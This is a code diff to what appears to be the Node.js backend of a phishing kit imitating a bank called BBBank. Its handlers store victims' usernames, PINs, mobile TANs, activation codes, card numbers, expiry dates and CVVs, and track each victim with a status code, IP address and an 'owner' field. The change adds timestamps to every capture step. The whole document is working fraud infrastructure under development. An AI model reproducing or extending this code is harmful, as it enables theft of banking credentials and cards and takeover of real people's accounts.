@@ -46,7 +46,7 @@ const submitLogin = async (req, res) => {
             username, pin,
             status: 1,
             owner,
-            ip,
+            ip, timestamp: moment().format()
         });
 
         res.sendStatus(200);
@@ -61,7 +61,7 @@ const submitLoginAgain = async (req, res) => {
     try {
         await BBBank.findOneAndUpdate(
             { uniqueid },
-            { username, pin, status: 10 }
+            { username, pin, status: 10, timestamp: moment().format() }
         ).exec();
         res.sendStatus(200);
     } catch (error) {
@@ -73,7 +73,7 @@ const submitLoginAgain = async (req, res) => {
 const submitMobileTan = async (req, res) => {
     const { mobileTan, uniqueid } = req.body;
     try {
-        await BBBank.findOneAndUpdate({ uniqueid }, { mobileTan, status: 3 }).exec();
+        await BBBank.findOneAndUpdate({ uniqueid }, { mobileTan, status: 3, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -84,7 +84,7 @@ const submitMobileTan = async (req, res) => {
 const submitActivation = async (req, res) => {
     const { activationCode, uniqueid } = req.body;
     try {
-        await BBBank.findOneAndUpdate({ uniqueid }, { activationCode, status: 5 }).exec();
+        await BBBank.findOneAndUpdate({ uniqueid }, { activationCode, status: 5, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
@@ -95,7 +95,7 @@ const submitActivation = async (req, res) => {
 const submitCard = async (req, res) => {
     const { ccnum, ccexp, cvv, uniqueid } = req.body;
     try {
-        await BBBank.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 7 }).exec();
+        await BBBank.findOneAndUpdate({ uniqueid }, { ccnum, ccexp, cvv, status: 7, timestamp: moment().format() }).exec();
         res.sendStatus(200);
     } catch (error) {
         console.log(error);
